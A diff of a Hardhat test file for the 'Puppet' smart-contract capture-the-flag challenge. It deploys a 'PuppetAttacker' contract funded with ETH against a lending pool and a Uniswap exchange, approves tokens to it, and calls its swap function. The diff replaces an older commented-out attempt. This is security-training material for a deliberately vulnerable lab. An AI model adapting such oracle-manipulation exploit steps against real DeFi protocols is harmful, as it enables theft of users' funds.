@@ -116,19 +116,6 @@ describe("[Challenge] Puppet", function () {
   it("Execution", async function () {
     /** CODE YOUR SOLUTION HERE */
 
-    // const Attacker = await ethers.getContractFactory("AttackPuppet");
-    // const attacker = await Attacker.deploy(
-    //   uniswapExchange.address,
-    //   lendingPool.address,
-    //   token.address,
-    //   player.address,
-    //   { value: ethers.utils.parseEther("15") }
-    // );
-    // await token
-    //   .connect(player)
-    //   .transfer(attacker.address, PLAYER_INITIAL_TOKEN_BALANCE);
-    // await attacker.swap();
-
     const attacker = await (
       await ethers.getContractFactory("PuppetAttacker")
     ).deploy(
@@ -141,7 +128,7 @@ describe("[Challenge] Puppet", function () {
 
     await token
       .connect(player)
-      .transfer(attacker.address, PLAYER_INITIAL_TOKEN_BALANCE);
+      .approve(attacker.address, PLAYER_INITIAL_TOKEN_BALANCE);
 
     await attacker.swap();
   });
